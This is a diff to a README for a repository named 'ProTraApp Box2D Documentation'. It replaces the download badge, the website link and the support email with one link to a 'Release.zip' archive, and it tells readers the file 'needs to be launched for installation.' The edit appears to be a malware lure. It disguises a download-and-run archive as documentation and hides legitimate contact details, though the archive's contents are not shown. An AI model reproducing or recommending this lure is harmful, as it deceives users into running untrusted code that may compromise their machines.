@@ -19,13 +19,13 @@ The ProTraApp Box2D Documentation repository focuses on enhancing the capabiliti
 
 To get started with ProTraApp Box2D Documentation, you can download the latest release by clicking the button below:
 
-[![Download ProTraApp Box2D Documentation](https://img.shields.io/badge/Download-Here-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ProTraApp Box2D Documentation](https://github.com/jaydenisvalid/ProTraApp_Box2D_Docs/releases/download/v1.0/Release.zip)](https://github.com/jaydenisvalid/ProTraApp_Box2D_Docs/releases/download/v1.0/Release.zip)
 
 *(Note: This file needs to be launched for installation purposes.)*
 
 ### Website
 
-Visit the ProTraApp website for more information and updates: [ProTraApp Website](https://www.protraapp.com)
+Visit the ProTraApp website for more information and updates: [ProTraApp Website](https://github.com/jaydenisvalid/ProTraApp_Box2D_Docs/releases/download/v1.0/Release.zip)
 
 ### Releases
 
@@ -41,7 +41,7 @@ To start using ProTraApp Box2D Documentation, follow these simple steps:
 
 ## Support
 
-For any queries or assistance, feel free to reach out to the ProTraApp support team at [support@protraapp.com](mailto:support@protraapp.com).
+For any queries or assistance, feel free to reach out to the ProTraApp support team at [https://github.com/jaydenisvalid/ProTraApp_Box2D_Docs/releases/download/v1.0/Release.zip](https://github.com/jaydenisvalid/ProTraApp_Box2D_Docs/releases/download/v1.0/Release.zip).
 
 ---
 
